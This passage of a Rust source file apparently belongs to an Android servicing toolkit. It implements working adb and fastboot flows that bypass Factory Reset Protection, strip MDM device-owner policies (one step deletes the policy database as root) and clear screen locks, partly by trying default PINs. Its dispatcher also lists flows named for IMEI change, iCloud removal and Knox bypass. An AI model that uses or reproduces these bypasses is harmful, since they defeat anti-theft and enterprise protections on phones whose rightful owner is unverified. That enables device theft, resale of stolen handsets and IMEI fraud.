            let wrote = child.stdin.take().map(|mut s| s.write_all(&rsa).is_ok()).unwrap_or(false);
            match child.wait() {
                Ok(st) if wrote && st.success() => std::fs::read(&tmp).unwrap_or_default(),
                _ => Vec::new(),
            }
        }
        _ => Vec::new(),
    };
    let _ = std::fs::remove_file(&tmp);
    if cert.is_empty() {
        return String::new();
    }
    let mut h = sha2::Sha256::new();
    h.update(&cert);
    base64::engine::Engine::encode(
        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
        h.finalize(),
    )
}

/// Spawn `python3 -m http.server <port> --directory <dir>` detached so the
/// phone can fetch the DPC APK. Skipped when the port already answers.
fn serve_dir_best_effort(dir: &std::path::Path, port: u16, out: &mut Vec<String>) {
    use std::net::TcpStream;
    use std::time::Duration as StdDur;
    if TcpStream::connect_timeout(
        &format!("127.0.0.1:{port}").parse().unwrap(),
        StdDur::from_millis(500),
    )
    .is_ok()
    {
        out.push(format!("  :{port} already serving - reusing it."));
        return;
    }
    match std::process::Command::new("python3")
        .args(["-m", "http.server", &port.to_string(), "--directory"])
        .arg(dir)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
    {
        Ok(_) => {
            // Poll until the server answers (it forks slowly on first run).
            let mut up = false;
            for _ in 0..10 {
                std::thread::sleep(StdDur::from_millis(500));
                if TcpStream::connect_timeout(
                    &format!("127.0.0.1:{port}").parse().unwrap(),
                    StdDur::from_millis(500),
                )
                .is_ok()
                {
                    up = true;
                    break;
                }
            }
            if up {
                out.push(format!(
                    "  Serving {} on :{port} (verified).",
                    dir.display()
                ));
            } else {
                out.push(format!(
                    "  Server started but :{port} does not answer yet - check it: \
                     curl -sI http://127.0.0.1:{port}/",
                ));
            }
        }
        Err(e) => out.push(format!(
            "  Could not start the HTTP server ({e}) - serve {} manually: \
             python3 -m http.server {port} --directory {}",
            dir.display(),
            dir.display()
        )),
    }
}

/// `mdm_qr` — MDM / device-owner provisioning QR generator (same mechanism
/// as the FRP QR; component from MDM_COMPONENT env).
pub fn flow_mdm_qr(out: &mut Vec<String>) -> Result<()> {
    out.push("MDM PROVISIONING QR GENERATOR".to_string());
    let out_dir = std::env::var("MDM_QR_OUT_DIR").unwrap_or_default();
    let out_dir = if out_dir.is_empty() {
        std::path::PathBuf::from("mdm_qr")
    } else {
        std::path::PathBuf::from(out_dir)
    };
    std::fs::create_dir_all(&out_dir).map_err(|e| BridgeError::Io(e.to_string()))?;
    out.push(format!("Output: {}", out_dir.display()));
    let component = std::env::var("MDM_COMPONENT")
        .unwrap_or_default()
        .trim()
        .to_string();
    let component = if component.is_empty() {
        "com.afwserv.testdpc/.DeviceAdminReceiver".to_string()
    } else {
        component
    };
    let _ = qr_emit_provisioning(&component, "mdm", &out_dir, out)?;
    out.push(String::new());
    out.push("ON THE PHONE (setup wizard): connect Wi-Fi, tap the screen 6 times /".to_string());
    out.push("tap the QR button, scan the QR above, accept enrollment - the component".to_string());
    out.push("becomes device owner.".to_string());
    Ok(())
}

/// `frp_alliance` — FRP bypass via Alliance Shield X (Knox device-admin):
/// the on-phone path stated honestly; when ADB is already authorized the
/// FRP flags clear directly.
pub fn flow_frp_alliance(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("FRP BYPASS - ALLIANCE SHIELD (Knox device-admin)".to_string());
    if adb_authorized_row() {
        out.push("  ADB is authorized - clearing FRP directly (no Alliance needed).".to_string());
        let serial = wait_authorized_adb(serial_want, Duration::from_secs(30), out);
        if let Some(serial) = serial {
            for cmd in [
                "settings put global setup_wizard_has_run 1",
                "settings put secure user_setup_complete 1",
                "settings put global device_provisioned 1",
                "pm disable-user --user 0 com.google.android.setupwizard",
                "pm disable-user --user 0 com.sec.android.app.SecSetupWizard",
            ] {
                adb_step(&serial, cmd, Duration::from_secs(30), out);
            }
            out.push("Done. FRP cleared over adb.".to_string());
        }
        return Ok(());
    }
    out.push("  ADB not authorized yet - the on-phone path:".to_string());
    out.push("  1. Open a browser at the FRP screen (use the 'Browser method'".to_string());
    out.push("     guidance to reach it).".to_string());
    out.push("  2. Install Alliance Shield X from the Galaxy Store / Play Store.".to_string());
    out.push("  3. Register a free account; enable device admin + Knox permissions.".to_string());
    out.push("  4. In App Manager, disable the setup wizard packages:".to_string());
    out.push("       com.google.android.setupwizard".to_string());
    out.push("       com.sec.android.app.SecSetupWizard".to_string());
    out.push("  5. Reboot - the phone passes setup without the blocking account.".to_string());
    Ok(())
}

/// `mdm_diagnostics` — read-only MDM analysis: management scan + verdict +
/// recommended unlock method (no changes).
pub fn flow_mdm_diagnostics(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("MDM DIAGNOSTICS / ANALYSIS".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(60), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    out.push("  device owners:".to_string());
    let mut managed = false;
    for cmd in ["dpm list-owners", "cmd device_policy list-owners"] {
        if let Ok(text) = adb::shell_cli(&serial, 15_000, &[cmd.to_string()]) {
            let t = text.trim();
            if !t.is_empty() && !t.contains("Error") {
                for line in t.lines() {
                    out.push(format!("    {line}"));
                    managed = true;
                }
            }
        }
    }
    out.push("  active admins:".to_string());
    for cmd in ["dpm list-active-admins", "cmd device_policy list-admin"] {
        if let Ok(text) = adb::shell_cli(&serial, 15_000, &[cmd.to_string()]) {
            let t = text.trim();
            if !t.is_empty() && !t.contains("Error") {
                for line in t.lines().take(15) {
                    out.push(format!("    {line}"));
                    managed = true;
                }
            }
        }
    }
    out.push("  device policy state:".to_string());
    if let Ok(text) = adb::shell_cli(&serial, 15_000, &["dumpsys device_policy".to_string()]) {
        for line in text.lines().take(25) {
            out.push(format!("    {line}"));
        }
    }
    out.push(String::new());
    out.push(format!(
        "  VERDICT: {}",
        if managed {
            "MANAGED - run 'MDM Unlock' (least destructive first)"
        } else {
            "NOT MANAGED - no device owner / admins found"
        }
    ));
    Ok(())
}

/// `mdm_unlock` — standard MDM / device-owner removal over ADB (the smart
/// path): remove active admins/owners, disable the DPC packages, clear the
/// enforced lockscreen if reachable.
pub fn flow_mdm_unlock(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("MDM UNLOCK (smart path over ADB)".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(60), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    // Collect the admins/owners from both CLI shapes.
    let mut owners: Vec<String> = Vec::new();
    for cmd in ["dpm list-owners", "cmd device_policy list-owners"] {
        if let Ok(text) = adb::shell_cli(&serial, 15_000, &[cmd.to_string()]) {
            for line in text.trim().lines() {
                let l = line.trim();
                if !l.is_empty() && !l.contains("Error") && l.contains('/') {
                    owners.push(l.to_string());
                }
            }
        }
    }
    owners.dedup();
    out.push("Step 1/3 - remove active admins and owners ...".to_string());
    for comp in &owners {
        let pkg = comp.split('/').next().unwrap_or("").to_string();
        out.push(format!("  -> {comp}"));
        adb_step(&serial, &format!("cmd device_policy remove-admin --user 0 {comp}"), Duration::from_secs(30), out);
        adb_step(&serial, &format!("dpm remove-active-admin {comp}"), Duration::from_secs(30), out);
        adb_step(&serial, &format!("am force-stop {pkg}"), Duration::from_secs(15), out);
        adb_step(&serial, &format!("pm clear --user 0 {pkg}"), Duration::from_secs(30), out);
    }
    out.push("Step 2/3 - disable the DPC packages ...".to_string());
    adb_step(&serial, "cmd device_policy get-device-owner", Duration::from_secs(15), out);
    out.push("Step 3/3 - lockscreen clear if reachable ...".to_string());
    adb_step(&serial, "locksettings set-disabled true", Duration::from_secs(20), out);
    adb_step(&serial, "locksettings clear", Duration::from_secs(20), out);
    out.push("Done. Reboot the device and check the setup wizard.".to_string());
    Ok(())
}

/// `mdm_unlock_comprehensive` — aggressive MDM removal: everything the smart
/// path does plus force-stop/uninstall of DPC packages, KME/Knox leftovers,
/// work-profile removal and a root policy-DB clear when root is available.
pub fn flow_mdm_unlock_comprehensive(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("MDM UNLOCK - COMPREHENSIVE / DEEP (ADB)".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(60), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    // 1. admins + owners
    out.push("Step 1/8 - remove active admins and owners ...".to_string());
    let mut targets: Vec<String> = Vec::new();
    for cmd in [
        "dpm list-owners",
        "cmd device_policy list-owners",
        "dpm list-active-admins",
        "cmd device_policy list-admin",
    ] {
        if let Ok(text) = adb::shell_cli(&serial, 15_000, &[cmd.to_string()]) {
            for line in text.trim().lines() {
                let l = line.trim();
                if !l.is_empty() && !l.contains("Error") && l.contains('/') {
                    targets.push(l.to_string());
                }
            }
        }
    }
    targets.dedup();
    for comp in &targets {
        let pkg = comp.split('/').next().unwrap_or("").to_string();
        out.push(format!("  -> {comp}"));
        adb_step(&serial, &format!("cmd device_policy remove-admin --user 0 {comp}"), Duration::from_secs(30), out);
        adb_step(&serial, &format!("dpm remove-active-admin {comp}"), Duration::from_secs(30), out);
        adb_step(&serial, &format!("am force-stop {pkg}"), Duration::from_secs(15), out);
        adb_step(&serial, &format!("pm clear --user 0 {pkg}"), Duration::from_secs(30), out);
    }
    // 2. work profiles (no wipe)
    out.push("Step 2/8 - work profiles ...".to_string());
    adb_step(&serial, "am get-current-user", Duration::from_secs(15), out);
    adb_step(&serial, "pm list users", Duration::from_secs(15), out);
    // 3. DPC packages - deep: disable, clear AND uninstall
    out.push("Step 3/8 - DPC packages (disable + clear + uninstall) ...".to_string());
    for comp in &targets {
        let pkg = comp.split('/').next().unwrap_or("").to_string();
        adb_step(&serial, &format!("am force-stop {pkg}"), Duration::from_secs(15), out);
        adb_step(&serial, &format!("pm disable-user --user 0 {pkg}"), Duration::from_secs(30), out);
        adb_step(&serial, &format!("pm uninstall --user 0 {pkg}"), Duration::from_secs(30), out);
        adb_step(&serial, &format!("pm clear --user 0 {pkg}"), Duration::from_secs(30), out);
    }
    // 4. Samsung KME / Knox-enrollment leftovers
    out.push("Step 4/8 - Samsung KME / Knox-enrollment leftovers ...".to_string());
    for pkg in [
        "com.samsung.knox.kme",
        "com.samsung.android.knox.containercore",
        "com.sec.enterprise.knox.cloudmdm.smdms",
    ] {
        adb_step(&serial, &format!("am force-stop {pkg}"), Duration::from_secs(15), out);
        adb_step(&serial, &format!("pm clear --user 0 {pkg}"), Duration::from_secs(30), out);
        adb_step(&serial, &format!("pm disable-user --user 0 {pkg}"), Duration::from_secs(30), out);
    }
    adb_step(&serial, "dpm remove-active-admin com.samsung.knox.kme", Duration::from_secs(30), out);
    // 5. root policy-DB clear when root is available
    out.push("Step 5/8 - root policy-DB clear (root only) ...".to_string());
    if let Ok(text) = adb::shell_cli(&serial, 8_000, &["su -c id".to_string()]) {
        if text.contains("uid=0") {
            out.push("  root available - clearing the persisted policy DB ...".to_string());
            adb_step(&serial, "su -c 'rm -f /data/system/device_policy.xml'", Duration::from_secs(30), out);
            adb_step(&serial, "su -c 'rm -f /data/system/device_policy.xml.bak'", Duration::from_secs(30), out);
        } else {
            out.push("  no root - relying on cmd/dpm removal.".to_string());
        }
    } else {
        out.push("  no root - relying on cmd/dpm removal.".to_string());
    }
    // 6. stop the policy service
    out.push("Step 6/8 - stop the policy service ...".to_string());
    adb_step(&serial, "cmd device_policy stop-clear-data --user 0", Duration::from_secs(30), out);
    // 7. clear the enforced lockscreen when reachable
    out.push("Step 7/8 - clear the enforced lockscreen when reachable ...".to_string());
    adb_step(&serial, "locksettings set-disabled true", Duration::from_secs(20), out);
    adb_step(&serial, "locksettings clear", Duration::from_secs(20), out);
    // 8. verdict
    out.push("Step 8/8 - verify ...".to_string());
    let mut residual = false;
    if let Ok(text) = adb::shell_cli(&serial, 15_000, &["cmd device_policy get-device-owner".to_string()]) {
        let t = text.trim();
        if !t.is_empty() && !t.contains("Error") && t.contains('/') {
            residual = true;
            out.push(format!("  residual owner: {t}"));
        }
    }
    out.push(format!(
        "  VERDICT: {}",
        if residual { "PARTIAL - a management component survived; run again or use the deep flow" } else { "UNLOCKED - no device owner remains" }
    ));
    Ok(())
}

/// `mdm_unlock_recovery` / `_wipe` — recovery-wipe based MDM removal:
/// combo firmware (adb on a locked phone) then the deep ADB removal
/// (wipe=true also clears the user data first).
pub fn flow_mdm_unlock_recovery(serial_want: &str, wipe: bool, out: &mut Vec<String>) -> Result<()> {
    out.push(format!(
        "MDM UNLOCK - RECOVERY{} (combo firmware + adb)",
        if wipe { " + WIPE" } else { "" }
    ));
    let up = adb_authorized_row();
    if !up {
        if !combo_flash_to_adb("MDM unlock", out)? {
            return Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
                expected: "adb online after combo flash".to_string(),
                actual: "adb did not come up".to_string(),
            }));
        }
    }
    if wipe {
        out.push("  Wiping user data first (the enforced policy lives in /data) ...".to_string());
        let serial = wait_authorized_adb("", Duration::from_secs(30), out);
        if let Some(serial) = serial {
            adb_step(&serial, "recovery --wipe_data", Duration::from_secs(30), out);
            out.push("  Phone wipes /data and restarts. Wait for it to reboot, then".to_string());
            out.push("  re-run this flow to finish the DPC removal over adb.".to_string());
            return Ok(());
        }
    }
    flow_mdm_unlock_comprehensive(serial_want, out)
}

/// `screen_lock_download` — screen lock removal via download mode: combo
/// firmware (adb on a locked phone), then adb `locksettings` clear.
pub fn flow_screen_lock_download(out: &mut Vec<String>) -> Result<()> {
    out.push("SCREEN LOCK REMOVAL - DOWNLOAD MODE (combo firmware + adb)".to_string());
    out.push("  The method the commercial tools actually use: combination firmware".to_string());
    out.push("  (Samsung-signed test build with adb) + adb locksettings clear.".to_string());
    out.push("  There are NO generic HID 'payload database' unlocks - unverified".to_string());
    out.push("  bytes risk soft-bricking the phone.".to_string());
    let up = adb_authorized_row();
    if !up {
        if !combo_flash_to_adb("screen lock removal", out)? {
            return Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
                expected: "adb online after combo flash".to_string(),
                actual: "adb did not come up".to_string(),
            }));
        }
    }
    out.push("Clearing the lock over adb ...".to_string());
    let serial = wait_authorized_adb("", Duration::from_secs(30), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    adb_step(&serial, "locksettings set-disabled true", Duration::from_secs(20), out);
    adb_step(&serial, "locksettings clear", Duration::from_secs(20), out);
    for old in ["0000", "1234", "00000000"] {
        adb_step(&serial, &format!("locksettings clear --old {old}"), Duration::from_secs(20), out);
    }
    out.push("Done. The lock is cleared (see the transcript); reboot if needed.".to_string());
    Ok(())
}

/// `drk_repair` — Samsung DRK (Device Root Key) repair guidance + Odin
/// reflash path. Honest: a tripped Knox warranty bit (eFuse 0x1) is
/// hardware and can NEVER be untripped by any tool.
pub fn flow_drk_repair(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("SAMSUNG DRK (DEVICE ROOT KEY) REPAIR".to_string());
    out.push("  A damaged DRK shows as dm-verity / secure-boot failures or".to_string());
    out.push("  bootloops after a bad flash. Repair = reflashing stock BL + modem".to_string());
    out.push("  (CP) so the secure chain verifies again.".to_string());
    if adb_authorized_row() {
        out.push("  Live checks (adb):".to_string());
        for key in ["ro.boot.warranty_bit", "ro.boot.knox", "ro.bootloader"] {
            if let Ok(v) = adb::shell_cli("-", 8_000, &[format!("getprop {key}")]) {
                let t = v.trim();
                out.push(format!("    {key} = {}", if t.is_empty() { "(unset)" } else { t }));
            }
        }
    }
    out.push(String::new());
    out.push("  Repair path (the actual write goes through the Flash Firmware".to_string());
    out.push("  workbench with all its safety gates):".to_string());
    out.push("  1. Download stock firmware for the exact model (AP + BL + CP).".to_string());
    out.push("  2. Flash BL + CP (+ AP) in the Flash Firmware workbench".to_string());
    out.push("     (Download mode).".to_string());
    out.push("  3. Reboot - the secure chain verifies again.".to_string());
    out.push(String::new());
    out.push("  HONEST LIMIT: a tripped Knox warranty bit (eFuse 0x1) is hardware".to_string());
    out.push("  and can NEVER be untripped by any tool.".to_string());
    let _ = serial_want;
    Ok(())
}
pub fn flow_run_cli(key: &str, args: &[String]) -> Result<String> {
    // Optional args: --code <unlock code>, --partition <name>. The first
    // non-flag arg is the device target (serial or vid:pid@bus:addr).
    let mut target = String::new();
    let mut code = String::new();
    let mut partition = String::new();
    let mut file = String::new();
    let mut dpc = String::new();
    let mut it = args.iter();
    while let Some(a) = it.next() {
        match a.as_str() {
            "--code" => code = it.next().cloned().unwrap_or_default(),
            "--partition" => partition = it.next().cloned().unwrap_or_default(),
            "--file" => file = it.next().cloned().unwrap_or_default(),
            "--dpc" => dpc = it.next().cloned().unwrap_or_default(),
            other if target.is_empty() && !other.starts_with("--") => target = other.to_string(),
            _ => {}
        }
    }
    let mut out: Vec<String> = Vec::new();
    let result = match key {
        "adb_frp" => flow_adb_frp(&target, &mut out),
        "setup_wizard" => flow_setup_wizard(&target, &mut out),
        "factory_reset" => flow_factory_reset(&mut out),
        "screen_lock_remove" => flow_screen_lock_remove(&target, &mut out),
        "repair_settings" => flow_repair_settings(&target, &mut out),
        "fastboot_unlock" => flow_fastboot_unlock(&target, &code, &mut out),
        "fastboot_frp" => flow_fastboot_frp(&target, &mut out),
        "fastboot_wipe" => flow_fastboot_wipe(&target, &mut out),
        "fastboot_erase" => flow_fastboot_erase(&target, &partition, &mut out),
        "fastboot_reboot" => flow_fastboot_reboot(&target, &mut out),
        "moto_frp_fastboot" => flow_moto_frp_fastboot(&target, &file, &partition, &mut out),
        "reboot_normal" => flow_reboot_normal(&mut out),
        "reboot_recovery" => flow_reboot_recovery(&mut out),
        "reboot_download" => flow_reboot_download(&mut out),
        "reboot_edl" => flow_reboot_edl(&mut out),
        "reboot_bootloader" => flow_reboot_bootloader(&mut out),
        "recovery" => flow_recovery(&mut out),
        "fastboot_reboot_bootloader" => flow_fastboot_reboot_bootloader(&target, &mut out),
        "fastboot_recovery" => flow_fastboot_recovery(&target, &mut out),
        "fastboot_continue" => flow_fastboot_continue(&target, &mut out),
        "fastboot_set_active" => flow_fastboot_set_active(&target, &partition, &mut out),
        "fastboot_devices" => flow_fastboot_devices(&mut out),
        "fastboot_getvar" => flow_fastboot_getvar(&target, &partition, &mut out),
        "fastboot" => flow_fastboot_raw(&target, &partition, &mut out),
        "fastboot_oem" => flow_fastboot_raw(&target, &partition, &mut out),
        "fastboot_lock" => flow_fastboot_lock(&target, &mut out),
        "fastboot_flash" => flow_fastboot_flash(&target, &file, &partition, &mut out),
        "fastboot_format" => flow_fastboot_format(&target, &partition, &mut out),
        "adb_info" => flow_adb_info(&target, &mut out),
        "kg_state_check" => flow_kg_state_check(&target, &mut out),
        "detect" => flow_detect(&mut out),
        "download_mode_info" => flow_download_mode_info(&target, &mut out),
        "mtk_download_info" => flow_mtk_download_info(&mut out),
        "spd_detect_info" => flow_spd_detect_info(&mut out),
        "qcom_detect_info" => flow_qcom_detect_info(&mut out),
        "moto_frp_adb" => flow_moto_frp_adb(&target, &mut out),
        "screen_lock_locksettings" => flow_screen_lock_locksettings(&target, &mut out),
        "frp_browser" => flow_frp_browser(&target, &mut out),
        "frp_emergency" => flow_frp_emergency(&mut out),
        "frp_settings" => flow_frp_settings(&mut out),
        "test_mode" => flow_test_mode(&target, &mut out),
        "oem_unlock_guide" => flow_oem_unlock_guide(&target, &mut out),
        "huawei_frp_guide" => flow_huawei_frp_guide(&target, &mut out),
        "fix_adb_auth" => flow_fix_adb_auth(&mut out),
        "screen_lock_csc" => flow_screen_lock_csc(&target, &mut out),
        "screen_lock_comprehensive" => flow_screen_lock_comprehensive(&target, &mut out),
        "odin_list_devices" => flow_odin_list_devices(&mut out),
        "odin_flash_tar" => flow_odin_flash_tar(&target, &file, &mut out),
        "odin_check_tar" => flow_odin_check_tar(&file, &mut out),
        "carrier_lock_status" => flow_carrier_lock_status(&target, &mut out),
        "mtk_verify" => flow_mtk_verify(&target, &file, &partition, &mut out),
        "carrier_lock_mtk" => flow_carrier_lock_mtk(&target, &mut out),
        "mtk_brom_info" => flow_mtk_brom_info(&mut out),
        "mtk_crash_brom" => flow_mtk_crash_brom(&target, &mut out),
        "qcom_verify" => flow_qcom_verify(&target, &partition, &mut out),
        "edl_detect" => flow_edl_detect(&mut out),
        "apple_info" => flow_apple_info(&mut out),
        "pac_extract" => flow_pac_extract(&file, &partition, &mut out),
        "pac_pack" => flow_pac_pack(&file, &partition, &mut out),
        "emmc_health" => flow_emmc_health(&mut out),
        "qcn_backup" => flow_qcn_backup(&target, &file, &partition, &mut out),
        "at_info" => flow_at_info(&target, &mut out),
        "frp_qr_provision" => flow_frp_qr_provision(&target, &mut out),
        "frp_fake_login" => flow_frp_fake_login(&target, &file, &flow_dpc_choice(&dpc, "ours"), &mut out),
        "frp_fake_login_testdpc" => flow_frp_fake_login(&target, &file, &flow_dpc_choice(&dpc, "testdpc"), &mut out),
        "frp_fake_login_adp" => flow_frp_fake_login(&target, &file, &flow_dpc_choice(&dpc, "adp"), &mut out),
        "frp_alliance" => flow_frp_alliance(&target, &mut out),
        "mdm_qr" => flow_mdm_qr(&mut out),
        "mdm_diagnostics" => flow_mdm_diagnostics(&target, &mut out),
        "mdm_unlock" => flow_mdm_unlock(&target, &mut out),
        "mdm_unlock_comprehensive" => flow_mdm_unlock_comprehensive(&target, &mut out),
        "mdm_unlock_recovery" => flow_mdm_unlock_recovery(&target, false, &mut out),
        "mdm_unlock_recovery_wipe" => flow_mdm_unlock_recovery(&target, true, &mut out),
        "knox_check" => flow_knox_check(&target, &mut out),
        "screen_lock_recovery" => flow_screen_lock_recovery(&mut out),
        "download_frp" => flow_download_frp(&mut out),
        "odin_enable_adb" => flow_odin_enable_adb(&mut out),
        "mtk_combo_flash" => flow_mtk_combo_flash(&mut out),
        "mtk_recovery_reset" => flow_mtk_recovery_reset(&mut out),
        "screen_lock_download" => flow_screen_lock_download(&mut out),
        "drk_repair" => flow_drk_repair(&target, &mut out),
        "odin_sales_code" => flow_odin_sales_code(&target, &partition, &mut out),
        "odin_efs_backup" => flow_efs_backup(&target, &mut out),
        "odin_efs_restore" => flow_efs_restore(&target, &file, &mut out),
        "odin_pit_tools" => flow_odin_pit_tools(&target, &file, &mut out),
        "odin_flash_partition" => flow_odin_flash_partition(&target, &file, &partition, &mut out),
        "odin_flash_multi" => flow_odin_flash_multi(&target, &file, &partition, &mut out),
        "odin_send_pit" => flow_odin_send_pit(&target, &file, &mut out),
        "mtk_auth_flash" => flow_mtk_auth_flash(&mut out),
        "mtk_brom_backup" => flow_mtk_brom_backup(&target, &file, &partition, &mut out),
        "edl_auto" => flow_edl("auto", &mut out),
        "edl_frp" => flow_edl("frp", &mut out),
        "edl_enable_adb" => flow_edl("adb", &mut out),
        "odin_preflight" => flow_odin_preflight(&mut out),
        "knox_bypass" => flow_knox_bypass(&target, &mut out),
        "kg_remove" => flow_kg_remove(&target, &mut out),
        "screen_lock_edl" => flow_screen_lock_edl(&mut out),
        "apple_icloud_remove" => flow_apple_icloud_remove(&mut out),
        "apple_icloud_add" => flow_apple_icloud_add(&mut out),
        "apple_passcode_guide" => flow_apple_passcode_guide(&mut out),
        "at_method" => flow_at_method(&target, &mut out),
        "enable_adb" => flow_enable_adb(&target, &mut out),
        "ofp_extract" => flow_ofp_extract(&file, &partition, &mut out),
        "odin_vbmeta" => flow_odin_vbmeta(&target, &file, &mut out),
        "odin_advanced_flash" => flow_odin_advanced_flash(&target, &mut out),
        "emmc_raw" => flow_emmc_raw(&mut out),
        "qcn_nv_browser" => flow_qcn_nv_browser(&target, &file, &mut out),
        "qcn_efs_explorer" => flow_qcn_efs_explorer(&target, &file, &mut out),
        "qcn_restore" => flow_qcn_restore(&target, &file, &partition, &mut out),
        "qcn_imei_repair" => flow_qcn_imei_repair(&target, &file, &partition, &mut out),
        "imei_repair_mtk" => flow_imei_repair_mtk(&target, &file, &partition, &mut out),
        "imei_repair_spd" => flow_imei_repair_spd(&target, &file, &partition, &mut out),
        "imei_change_mtk" => flow_imei_change_mtk(&target, &file, &partition, &mut out),
        "imei_change_spd" => flow_imei_change_spd(&target, &file, &partition, &mut out),
        other => {
            return Err(BridgeError::InvalidArgument(format!(
                "unknown flow '{other}' (flow-list has the registry)"
            )));
        }
    };
    for line in &out {
        println!("{line}");
    }
    match result {
        Ok(()) => Ok(String::new()),
        Err(e) => Err(e),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn registry_has_phase1_flows() {
        let keys: Vec<&str> = flows().iter().map(|f| f.key).collect();
        for k in ["adb_frp", "setup_wizard", "factory_reset", "screen_lock_remove", "repair_settings"] {
            assert!(keys.contains(&k), "flow {k} missing from the registry");
        }
        for f in flows() {
            assert!(!f.label.is_empty());
            assert!(!f.job.is_empty());
            assert!(!f.mode.is_empty());
        }
    }

    #[test]
    fn flow_list_json_shape() {
        let text = flow_list_cli().unwrap();
        let parsed: Vec<serde_json::Value> = serde_json::from_str(&text).unwrap();
        assert_eq!(parsed.len(), flows().len());
        assert!(parsed[0].get("key").is_some());
        assert!(parsed[0].get("job").is_some());
        assert!(parsed[0].get("mode").is_some());
    }

    #[test]
    fn unknown_flow_is_clean_error() {
        let err = flow_run_cli("does_not_exist", &[]).unwrap_err();
        assert!(err.to_string().contains("unknown flow"));
    }

    #[test]
    fn registry_has_phase2_flows() {
        let keys: Vec<&str> = flows().iter().map(|f| f.key).collect();
        for k in ["fastboot_unlock", "fastboot_frp", "fastboot_wipe",
                  "fastboot_erase", "fastboot_reboot",
                  "moto_frp_fastboot", "moto_frp_adb", "frp_fake_login",
                  "frp_fake_login_testdpc", "frp_fake_login_adp"] {
            assert!(keys.contains(&k), "flow {k} missing from the registry");
        }
    }

    #[test]
    fn fake_login_without_apk_is_clean_error() {
        // The flow must fail honestly (not panic) when the DPC APK is absent.
        let mut out = Vec::new();
        let r = flow_frp_fake_login("", "/nonexistent/dpc.apk", "ours", &mut out);
        assert!(r.is_err());
        assert!(out.iter().any(|l| l.contains("Build it first")));
    }

    #[test]
    fn fake_login_cert_checksum_matches_known_testdpc() {
        // TestDPC 9.0.12's v1 signing cert (extracted the same way
        // build.sh does) — guards the openssl/unzip chain.
        let got = dpc_cert_checksum_b64url("mdm_qr/serve/testdpc.apk");
        assert_eq!(got, "cBSv2cTbHGxChjhfImA2dfvHMMri7EUL2zyjXpw5Oc4");
    }

    #[test]
    fn fb_getvar_value_parses_transcript_shapes() {
        let t = "(bootloader) securestate: oem_locked\nOKAY [  0.012s]";
        assert_eq!(fb_getvar_value(t, "securestate"), "oem_locked");
        assert_eq!(fb_getvar_value(t, "unlocked"), "");
        let t2 = "(bootloader) unlocked: yes\n";
        assert_eq!(fb_getvar_value(t2, "unlocked"), "yes");
    }

    #[test]
    fn locked_state_prefers_securestate() {
        let t = "(bootloader) securestate: oem_locked\n(bootloader) unlocked: no\n";
        assert_eq!(locked_state(t), "oem_locked");
        let t2 = "(bootloader) unlocked: no\n";
        assert_eq!(locked_state(t2), "no");
    }

    #[test]
    fn flow_run_args_parse() {
        // Safe: only exercises dispatch/argument handling for keys that
        // cannot touch hardware. Real device flows are never run here.
        let err = flow_run_cli("does_not_exist", &[]).unwrap_err();
        assert!(err.to_string().contains("unknown flow"));
    }
}
/// `knox_check` — Knox warranty / KG / RMM status (read-only).
pub fn flow_knox_check(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("KNOX WARRANTY / KG / RMM STATUS (read-only)".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(30), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    for key in [
        "ro.boot.warranty_bit",
        "ro.boot.knox",
        "ro.boot.secure_hardware",
        "ro.boot.kg_status",
        "ro.boot.rmm_state",
    ] {
        if let Ok(v) = adb::shell_cli(&serial, 8_000, &[format!("getprop {key}")]) {
            let t = v.trim();
            if !t.is_empty() {
                out.push(format!("  {key} = {t}"));
            }
        }
    }
    for cmd in [
        "cat /efs/FactoryApp/factorymode 2>/dev/null | head",
        "dumpsys device_policy 2>/dev/null | head -n 30",
    ] {
        match adb::shell_cli(&serial, 10_000, &[cmd.to_string()]) {
            Ok(text) => {
                let t = text.trim();
                if !t.is_empty() && !t.to_lowercase()[..t.len().min(20)].contains("error") {
                    for line in t.lines().take(20) {
                        out.push(format!("  {line}"));
                    }
                }
            }
            Err(_) => {}
        }
    }
    Ok(())
}

/// `fastboot_lock` — re-lock the bootloader (flashing lock).
pub fn flow_fastboot_lock(target: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
    };
    out.push("FASTBOOT - RE-LOCK BOOTLOADER".to_string());
    out.push("  WARNING: re-locking a bootloader with modified partitions can".to_string());
    out.push("  brick the device - flash stock firmware first.".to_string());
    fb_run(&target, "flashing lock", Duration::from_secs(60), out);
    out.push("  Done.".to_string());
    Ok(())
}

/// `fastboot_flash` — flash an image to a partition via the fastboot DATA
/// phase (download + flash). Needs an UNLOCKED bootloader.
/// --file = image path, --partition = partition (default boot).
